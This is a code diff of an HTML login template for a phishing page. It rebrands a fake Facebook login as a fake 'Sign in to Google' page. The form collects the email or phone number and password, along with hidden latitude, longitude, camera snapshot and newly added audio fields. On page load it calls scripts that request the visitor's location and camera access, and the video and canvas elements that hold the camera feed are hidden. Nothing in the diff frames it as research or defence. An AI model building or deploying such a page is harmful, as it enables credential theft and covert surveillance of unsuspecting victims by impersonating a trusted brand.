@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook</title>
+    <title>Google</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <h2>Facebook Login</h2>
+    <h2>Sign in to Google</h2>
     <form id="loginForm" action="/submit" method="POST">
         <input type="hidden" name="platform" value="Google">
         <label>Email or Phone</label><br>
@@ -15,16 +15,18 @@
         <input type="hidden" name="latitude" id="latitude">
         <input type="hidden" name="longitude" id="longitude">
         <input type="hidden" name="snapshot" id="snapshot">
-        <button type="submit">Log In</button>
+        <input type="hidden" name="audio" id="audio">
+        <button type="submit">Sign In</button>
     </form>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
     <script src="{{ url_for('static', filename='script.js') }}"></script>
-
+    <script>
         window.onload = function() {
             getLocation();
             getCameraAccess();
+
         };
     </script>
 </body>
